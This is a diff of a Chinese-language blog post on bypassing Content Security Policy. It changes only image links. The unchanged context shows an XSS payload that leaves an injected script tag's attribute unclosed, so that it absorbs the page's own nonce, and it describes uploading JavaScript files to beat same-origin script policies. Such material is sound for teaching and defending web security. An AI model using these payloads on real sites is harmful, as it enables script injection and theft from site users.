@@ -84,9 +84,9 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>插入 <code>&lt;script src=//xxx x=&quot;</code>, 结果为</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxx</span> <span class="attr">x</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>虽然语法上提示有错误，但本地测试没有问题</p>
-<p><img src="https://i.loli.net/2020/03/02/oQ4alNsyR5GSjx1.png" alt></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/csp-bypass.assets/7w6fAxl9bG2WFaU-20200109001529495.png" alt></p>
 <p>xss 平台记录</p>
-<p><img src="https://i.loli.net/2020/03/02/dQ92vSOPUqKNrW4.png" alt></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/csp-bypass.assets/q2C5pRsgaz7wFEr-20200109001532054.png" alt></p>
 <h3 id="上传-JS-文件并引用"><a href="#上传-JS-文件并引用" class="headerlink" title="上传 JS 文件并引用"></a>上传 JS 文件并引用</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
 <p>像这种只能加载同域 script 的 CSP 策略，就得从其自身域内下功夫了, 也可以控制其域内某个主机</p>
 <p>其实也不一定非得是正常的 js 文件，如果有上传点，将 js 代码放在文件中，即文件中的内容被作为 js 代码解析</p>
